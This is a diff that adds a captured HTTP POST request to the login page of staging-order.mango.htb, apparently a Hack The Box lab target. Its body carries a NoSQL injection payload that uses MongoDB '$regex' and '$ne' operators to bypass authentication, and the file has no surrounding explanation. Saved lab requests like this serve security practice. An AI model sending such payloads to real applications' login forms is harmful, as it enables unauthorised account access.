@@ -1,0 +1,17 @@
+POST / HTTP/1.1
+Host: staging-order.mango.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+Origin: http://staging-order.mango.htb
+Connection: close
+Referer: http://staging-order.mango.htb/
+Cookie: PHPSESSID=vgo94do04m13bf111b5ihoflmi
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Sec-GPC: 1
+
+username[$regex]={}&password[$ne]=test&login=login
